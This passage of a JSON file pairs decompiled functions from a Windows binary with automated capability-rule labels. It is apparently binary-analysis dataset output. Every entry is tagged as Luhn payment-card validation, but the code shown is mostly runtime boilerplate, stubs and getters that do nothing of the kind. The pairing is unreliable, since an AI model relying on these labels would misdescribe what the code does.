            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00402a72(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00404ff7(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00402a81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a81(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0xc));\n    fcn.00404179(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 71
    },
    "00402a86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402a86(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00402f4f(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 196
    },
    "00402ab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ab8(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    return in_ECX;\n}\n",
        "token_count": 43
    },
    "00402abd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402abd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00401f78(arg_8h, arg_ch, arg_10h, arg_14h, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "00402adb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402adb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040105a(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "00404f39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404f39(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00405853();\n    if (iVar2 != 0) {\n        fcn.00405c45(0x16);\n    }\n    if ((*0x571e64 & 2) != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n        if (iVar2 != 0) {\n            pcVar1 = swi(0x29);\n            (*pcVar1)();\n        }\n        fcn.00405a5b(3, 0x40000015, 1);\n    }\n    fcn.004060dc(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 185
    },
    "00402b58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00402b58(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *arg_ch,  uVar1 != 0; arg_ch = arg_ch + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    do {\n        puVar3 = arg_8h;\n        puVar2 = *puVar3;\n        if (*puVar3 == 0) {\n            return puVar2;\n        }\n        arg_8h = puVar3 + 1;\n    } while ((*(&uStack40 + (puVar2 >> 3)) >> (puVar2 & 7) & 1) == 0);\n    return puVar3;\n}\n",
        "token_count": 339
    },
    "00402b94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl\nfcn.00402b94(uint lpLocaleName, uint32_t dwMapFlags, uint lpMultiByteStr, int32_t arg_14h, uint arg_18h, int32_t arg_1ch\n            , uint CodePage, int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = arg_14h;\n    if (0 < arg_14h) {\n        iStack44 = 0x469648;\n        iVar1 = fcn.00402838(lpMultiByteStr, arg_14h);\n        iVar4 = iVar1 + 1;\n        if (arg_14h <= iVar1) {\n            iVar4 = iVar1;\n        }\n    }\n    uStack48 = lpMultiByteStr;\n    iStack52 = (arg_24h != 0) * 8 + 1;\n    uStack56 = CodePage;\n    puVar3 = &stack0xffffffc8;\n    iStack44 = iVar4;\n    iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar1 == 0) goto code_r0x004697df;\n    uVar2 = iVar1 * 2 + 8;\n    uVar2 = -(iVar1 * 2 < uVar2) & uVar2;\n    if (uVar2 != 0) {\n        if (uVar2 < 0x401) {\n            fcn.004034f4();\n            if (*0x10 != 0x38) {\n                uStack56 = 0xcccc;\n                puVar3 = &stack0xffffffc8;\ncode_r0x004696c0:\n                puVar3 = puVar3 + 2;\n            }\n        }\n        else {\n            puVar3 = fcn.00401596(uVar2);\n            if (puVar3 != NULL) {\n                *puVar3 = 0xdddd;\n                goto code_r0x004696c0;\n            }\n        }\n        if ((puVar3 != NULL) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 1, lpMultiByteStr, iVar4, puVar3, iVar1), \n           iVar4 != 0)) {\n            puVar5 = &stack0xffffffc8;\n            iVar4 = (*_sym.imp.KERNEL32.dll_LCMapStringEx)(lpLocaleName, dwMapFlags, puVar3, iVar1, 0, 0, 0, 0, 0);\n            if (iVar4 != 0) {\n                if ((dwMapFlags & 0x400) == 0) {\n                    uVar2 = iVar4 * 2 + 8;\n                    uVar2 = -(iVar4 * 2 < uVar2) & uVar2;\n                    if (uVar2 != 0) {\n                        if (uVar2 < 0x401) {\n                            fcn.004034f4();\n                            if (*0x10 != 0x38) {\n                                uStack56 = 0xcccc;\n                                puVar5 = &stack0xffffffc8;\ncode_r0x00469778:\n                                puVar5 = puVar5 + 2;\n                            }\n                        }\n                        else {\n                            puVar5 = fcn.00401596(uVar2);\n                            if (puVar5 != NULL) {\n                                *puVar5 = 0xdddd;\n                                goto code_r0x00469778;\n                            }\n                        }\n                        if ((puVar5 != NULL) &&\n                           (iVar6 = (*_sym.imp.KERNEL32.dll_LCMapStringEx)\n                                              (lpLocaleName, dwMapFlags, puVar3, iVar1, puVar5, iVar4, 0, 0, 0), \n                           iVar6 != 0)) {\n                            if (arg_1ch == 0) {\n                                arg_1ch = 0;\n                                arg_18h = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (CodePage, 0, puVar5, iVar4, arg_18h, arg_1ch, 0, 0);\n                        }\n                    }\n                    fcn.00403828();\n                }\n                else if ((arg_1ch != 0) && (iVar4 <= arg_1ch)) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringEx)\n                              (lpLocaleName, dwMapFlags, puVar3, iVar1, arg_18h, arg_1ch, 0, 0, 0);\n                }\n            }\n        }\n    }\n    fcn.00403828();\ncode_r0x004697df:\n    fcn.004030bc(iVar1);\n    return;\n}\n",
        "token_count": 1169
    },
    "00402b9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402b9e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004059ac(arg_8h, arg_ch, arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 57
    },
    "00402bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402bf8(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack20;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        piVar3 = arg_8h;\n        if (arg_10h != 0) {\n            do {\n                if (*piVar3 == 0) break;\n                piVar3 = piVar3 + 1;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                arg_10h = arg_10h - piVar3;\n                do {\n                    iVar1 = *(arg_10h + piVar3);\n                    *piVar3 = iVar1;\n                    piVar3 = piVar3 + 1;\n                    if (iVar1 == 0) break;\n                    arg_ch = arg_ch + -1;\n                } while (arg_ch != 0);\n                if (arg_ch != 0) {\n                    return 0;\n                }\n                *arg_8h = 0;\n                puVar2 = fcn.00403a35();\n                uStack20 = 0x22;\n                goto code_r0x004cb9e2;\n            }\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.00403a35();\n    uStack20 = 0x16;\ncode_r0x004cb9e2:\n    *puVar2 = uStack20;\n    fcn.004037ce();\n    return uStack20;\n}\n",
        "token_count": 383
    },
    "00402c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402c5c(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.00406064(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 225
    },
    "00402c66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402c66(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00493c3a(1, \"FlsFree\", 0x555eec, 0x555ef4);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(arg_8h);\n    }\n    else {\n        (**0x578000)();\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00402c84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402c84(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x10);\n}\n",
        "token_count": 40
    },
    "00402c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00402c98(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00405e2a(param_1);\n    return;\n}\n",
        "token_count": 58
    },
    "00402cbb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cbb(uint arg_8h)\n\n{\n    uint unaff_EBP;\n    \n    fcn.00402513(arg_8h, unaff_EBP);\n    return;\n}\n",
        "token_count": 47
    },
    "00402cf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402cf7(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "00402cfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402cfc(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.004011ef(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.0040443a(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.00403189(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 248
    },
    "00402d24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d24(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004ca267(0x1e, \"AppPolicyGetShowDeveloperDiagnostic\", 0x559934, \"AppPolicyGetShowDeveloperDiagnostic\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x578000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 133
    },
    "00402d42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d42(uint arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = arg_8h;\n    in_ECX[1] = arg_ch;\n    return;\n}\n",
        "token_count": 63
    },
    "00402d65": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d65(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_10h;\n    *in_ECX = arg_8h;\n    in_ECX[1] = arg_ch;\n    *(in_ECX + 3) = 0;\n    iVar2 = fcn.00405b64(arg_8h, arg_ch, arg_10h + 0x250, 0x55);\n    if (iVar2 == 0) {\n        return;\n    }\n    fcn.0040366b(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 192
    },
    "00402dab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00402dab(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00406249(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00402dce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402dce(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 32
    },
    "00402e1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402e1e(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    if (arg_ch - arg_8h < arg_14h) {\n        arg_14h = arg_ch - arg_8h;\n    }\n    fcn.00493859(arg_8h, arg_10h, arg_14h);\n    return arg_8h + arg_14h;\n}\n",
        "token_count": 111
    },
    "00402ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402ef0(code **param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401cda(0x54674c, 1);\n    *param_1 = vtable.std::bad_cast.0;\n    return;\n}\n",
        "token_count": 70
    },
    "00402efa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402efa(int32_t param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4272c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0x10));\n    fcn.00404179(*(param_1 + 0x14));\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 182
    },
    "00402f04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f04(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    uint *puVar2;\n    int16_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    *in_ECX = piVar1 + -1;\n    if ((arg_8h != 0) && (piVar1[-1] != arg_8h)) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00402f22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402f22(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403526(arg_8h, arg_8h + 0xe, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 80
    },
    "00403026": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403026(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    do {\n        uVar1 = *arg_8h;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar1 = uVar1 + 0x20;\n        }\n        uVar2 = *arg_ch;\n        arg_8h = arg_8h + 1;\n        if (uVar2 - 0x41 < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n        arg_ch = arg_ch + 1;\n    } while ((uVar1 == uVar2) && (uVar1 != 0));\n    return;\n}\n",
        "token_count": 186
    },
    "00403035": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403035(int32_t param_1)\n\n{\n    ushort var_ah;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 7;\n    var_ah = 0;\n    var_8h = param_1;\n    var_4h = param_1;\n    fcn.00401456(param_1, &var_ah);\n    return;\n}\n",
        "token_count": 121
    },
    "00403058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403058(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t in_stack_ffffffdc;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_bp_8h;\n    \n    if (arg_ch < *(in_ECX + 0x14) || arg_ch == *(in_ECX + 0x14)) {\n        var_10h = fcn.00406087();\n        *(in_ECX + 0x10) = arg_ch;\n        fcn.00402b9e(var_10h, arg_8h, arg_ch);\n        var_14h._3_1_ = 0;\n        fcn.00405e0c(var_10h + arg_ch, &var_14h + 3);\n        var_bp_8h = in_ECX;\n    }\n    else {\n        var_bp_8h = fcn.00402fa4(arg_ch, in_stack_ffffffdc & 0xffffff00 | var_14h, arg_8h);\n    }\n    return var_bp_8h;\n}\n",
        "token_count": 278
    },
    "004030a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.004030a3(char *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    char *pcVar5;\n    char *lpMultiByteStr;\n    int32_t iVar6;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort *var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    pcVar5 = arg_8h;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = 0;\n    pcVar5 = pcVar5 + (1 - (arg_8h + 1));\n    var_8h = pcVar5;\n    lpMultiByteStr = arg_8h;\n    while ((pcVar5 != NULL && (iVar3 = fcn.00403d7d(&var_4h, lpMultiByteStr, pcVar5, &var_14h, arg_10h),  0 < iVar3))) {\n        lpMultiByteStr = lpMultiByteStr + iVar3;\n        iVar6 = iVar6 + 1;\n        pcVar5 = pcVar5 + -iVar3;\n    }\n    iVar6 = iVar6 + 1;\n    var_ch = fcn.004033dc(iVar6, 2);\n    if (var_ch != NULL) {\n        var_1ch = 0;\n        var_18h = 0;\n        puVar4 = var_ch;\n        while ((iVar6 != 0 && (iVar3 = fcn.00403d7d(puVar4, arg_8h, var_8h, &var_1ch, arg_10h),  0 < iVar3))) {\n            arg_8h = arg_8h + iVar3;\n            puVar4 = puVar4 + 1;\n            iVar6 = iVar6 + -1;\n        }\n        *puVar4 = 0;\n        return var_ch;\n    }\n    fcn.00401096();\n    pcVar2 = swi(3);\n    puVar4 = (*pcVar2)();\n    return puVar4;\n}\n",
        "token_count": 544
    },
    "004030f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __cdecl fcn.004030f3(uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffc8;\n    var_14h = 0x427020;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_28h = arg_8h;\n    var_24h._0_1_ = 1;\n    var_10h = 0;\n    fcn.00402e0f(&var_28h, in_ECX + 1);\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 261
    },
    "0040310c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040310c(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.00402eaa(param_4, param_1, param_2);\n    return;\n}\n",
        "token_count": 56
    },
    "0040311b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040311b(uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    for (puVar1 = *(in_ECX + 0x2c); puVar1 != NULL; puVar1 = *puVar1) {\n        pcVar2 = puVar1[2];\n        (**0x578000)(arg_8h);\n        (*pcVar2)();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0040312f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040312f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(param_1 + 0x404);\n    iVar2 = fcn.004059cf();\n    if (iVar1 == 0) {\n        iVar2 = iVar2 + param_1;\n    }\n    else {\n        iVar2 = iVar2 + iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0040313e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040313e(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.00403620();\n    return in_ST0;\n}\n",
        "token_count": 88
    },
    "004031d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004031d4(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.00406203(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00405dfd(unaff_EBX & 0xffffff00 | uVar1);\n        if (cVar2 == '\\0') {\n            *(param_1 + 0x18) = 0xffffffff;\n        }\n        else {\n            *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n        }\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 328
    },
    "00403201": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.00403201(char *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    char *pcVar5;\n    char *lpMultiByteStr;\n    int32_t iVar6;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort *var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    pcVar5 = arg_8h;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = 0;\n    pcVar5 = pcVar5 + (1 - (arg_8h + 1));\n    var_8h = pcVar5;\n    lpMultiByteStr = arg_8h;\n    while ((pcVar5 != NULL && (iVar3 = fcn.00403d7d(&var_4h, lpMultiByteStr, pcVar5, &var_14h, arg_10h),  0 < iVar3))) {\n        lpMultiByteStr = lpMultiByteStr + iVar3;\n        iVar6 = iVar6 + 1;\n        pcVar5 = pcVar5 + -iVar3;\n    }\n    iVar6 = iVar6 + 1;\n    var_ch = fcn.004033dc(iVar6, 2);\n    if (var_ch != NULL) {\n        var_1ch = 0;\n        var_18h = 0;\n        puVar4 = var_ch;\n        while ((iVar6 != 0 && (iVar3 = fcn.00403d7d(puVar4, arg_8h, var_8h, &var_1ch, arg_10h),  0 < iVar3))) {\n            arg_8h = arg_8h + iVar3;\n            puVar4 = puVar4 + 1;\n            iVar6 = iVar6 + -1;\n        }\n        *puVar4 = 0;\n        return var_ch;\n    }\n    fcn.00401096();\n    pcVar2 = swi(3);\n    puVar4 = (*pcVar2)();\n    return puVar4;\n}\n",
        "token_count": 543
    },
    "0040c4c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c4c0(uint arg_8h)\n\n{\n    fcn.00403530(0x574040, \"xijqwrWOBQOJCORjwonrxqowmro,botkunrkinruxqnrjwqnievqwbqnw\");\n    return 0;\n}\n",
        "token_count": 77
    },
    "0040321f": {
        "rules": [
